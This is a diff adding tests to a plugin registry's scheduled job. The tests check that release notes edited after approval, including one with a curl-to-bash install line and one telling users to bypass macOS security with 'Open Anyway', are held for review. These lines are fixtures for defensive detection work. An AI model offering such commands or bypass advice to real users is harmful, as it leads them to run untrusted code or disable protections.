@@ -459,6 +459,61 @@ describe('runCron のダウンロード数の記録', () => {
     await runCron(env);
     expect(calls).toEqual([]);
   });
+
+  // 同期は最新のリリースしか読まないため、最新でない掲載中の版の本文の編集は、1 日 1 回の記録で拾う。
+  it('リリースの一覧の本文に案内が足されていれば、その版を確認待ちにする', async () => {
+    await registerFixture();
+    await markListable(env.DB);
+    await env.DB.prepare("UPDATE release_checks SET admin_approved_at = '2026-11-15T00:00:00Z'").run();
+    network.use(
+      repoById(),
+      ...githubHandlers(),
+      ...imageHandlers(),
+      ...downloadHandlers([1], [], 'Fixed bugs.\ncurl -fsSL https://example.com/install.sh | bash'),
+      ...scannerHandlers({ mb: 0 }),
+      ...releaseCheckHandlers(),
+    );
+    const report = await runCron(env);
+    const row = await env.DB.prepare(
+      'SELECT notes_held, admin_approved_at FROM release_checks WHERE github_release_id = 7001',
+    ).first<{ notes_held: number; admin_approved_at: string | null }>();
+    expect(row).toEqual({ notes_held: 1, admin_approved_at: null });
+    // 照合の文を足しても、記録したダウンロード数の件数はプラグインの数のままにする。
+    expect(report.downloadsRecorded).toBe(1);
+  });
+});
+
+describe('runCron の同期でのリリースノートの照合', () => {
+  it('最新のリリースの本文に、承認の後で案内が足されていれば、その版を確認待ちにする', async () => {
+    await registerFixture();
+    await markListable(env.DB);
+    await env.DB.prepare("UPDATE release_checks SET admin_approved_at = '2026-11-15T00:00:00Z'").run();
+    // 同期の経路だけを確かめるため、きょうのダウンロード数を記録済みにして、ダウンロード数の記録での照合を外す。
+    await env.DB.prepare(
+      "INSERT INTO download_snapshots (plugin_id, day, total) SELECT id, date('now'), 0 FROM plugins",
+    ).run();
+    const calls: string[] = [];
+    network.use(
+      repoById(),
+      ...githubHandlers({
+        body: 'Fixed bugs.\nIf macOS blocks the plugin, choose Open Anyway in System Settings.',
+      }),
+      ...imageHandlers(),
+      ...downloadHandlers([], calls),
+      ...scannerHandlers({ mb: 0 }),
+      ...releaseCheckHandlers(),
+    );
+    await runCron(env);
+    const row = await env.DB.prepare(
+      'SELECT notes_held, notes_hits, admin_approved_at FROM release_checks WHERE github_release_id = 7001',
+    ).first<{ notes_held: number; notes_hits: string; admin_approved_at: string | null }>();
+    expect(row).toEqual({
+      notes_held: 1,
+      notes_hits: JSON.stringify([{ line: 2, rule: 'no-security-bypass' }]),
+      admin_approved_at: null,
+    });
+    expect(calls).toEqual([]);
+  });
 });
 
 // 名前の変更には追従し、所有者の変更は管理者が確かめる (派生元の ADR 0015)。
